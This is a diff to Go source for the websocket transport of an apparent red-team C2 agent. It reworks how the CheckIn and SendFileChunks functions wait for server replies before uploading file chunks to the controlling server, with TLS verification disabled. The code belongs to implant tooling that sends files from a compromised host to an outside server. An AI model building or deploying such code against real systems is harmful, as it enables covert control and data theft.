@@ -124,7 +124,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 	if (len(c.HostHeader) > 0) {
 		header.Set("Host", c.HostHeader)
 	}
-	
+
 	d := websocket.Dialer{
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
@@ -394,22 +394,38 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 	TaskResponses = append(TaskResponses, msg)
 	mu.Unlock()
 	// Wait for a response from the channel
-	resp := <-ch
 	var fileDetails map[string]interface{}
+	// Wait for a response from the channel
 
-	err := json.Unmarshal(resp, &fileDetails)
-	if err != nil {
-		errResponse := structs.Response{}
-		errResponse.Completed = true
-		errResponse.TaskID = task.TaskID
-		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
-		errResponseEnc, _ := json.Marshal(errResponse)
-		
-		mu.Lock()
-		TaskResponses = append(TaskResponses, errResponseEnc)
-		mu.Unlock()
-		return
+	for {
+		resp := <- ch
+		err := json.Unmarshal(resp, &fileDetails)
+		if err != nil {
+			errResponse := structs.Response{}
+			errResponse.Completed = true
+			errResponse.TaskID = task.TaskID
+			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+			errResponseEnc, _ := json.Marshal(errResponse)
+
+			mu.Lock()
+			TaskResponses = append(TaskResponses, errResponseEnc)
+			mu.Unlock()
+			return
+		}
+
+		//log.Printf("Receive file download registration response %s\n", resp)
+		if _, ok := fileDetails["file_id"]; ok {
+			if ok {
+				//log.Println("Found response with file_id key ", fileid)
+				break
+			} else {
+				//log.Println("Didn't find response with file_id key")
+				continue
+			}
+		}
 	}
+
+	
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
 	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
@@ -434,22 +450,34 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 		mu.Unlock()
 
 		// Wait for a response for our file chunk
-		decResp := <-ch
-
 		var postResp map[string]interface{}
-		err = json.Unmarshal(decResp, &postResp)
-		if err != nil {
-			errResponse := structs.Response{}
-			errResponse.Completed = true
-			errResponse.TaskID = task.TaskID
-			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
-			errResponseEnc, _ := json.Marshal(errResponse)
-			mu.Lock()
-			TaskResponses = append(TaskResponses, errResponseEnc)
-			mu.Unlock()
-			return
-		}
+		for {
+			decResp := <-ch
+			err := json.Unmarshal(decResp, &postResp)// Wait for a response for our file chunk
 		
+			if err != nil {
+				errResponse := structs.Response{}
+				errResponse.Completed = true
+				errResponse.TaskID = task.TaskID
+				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+				errResponseEnc, _ := json.Marshal(errResponse)
+				mu.Lock()
+				TaskResponses = append(TaskResponses, errResponseEnc)
+				mu.Unlock()
+				return
+			}
+
+			//log.Printf("Received chunk download response %s\n", decResp)
+			if _, ok := postResp["status"]; ok {
+				if ok {
+					//log.Println("Found response with status key: ", status)
+					break
+				} else {
+					//log.Println("Didn't find response with status key")
+					continue
+				}
+			}
+		}
 
 		if !strings.Contains(postResp["status"].(string), "success") {
 			// If the post was not successful, wait and try to send it one more time
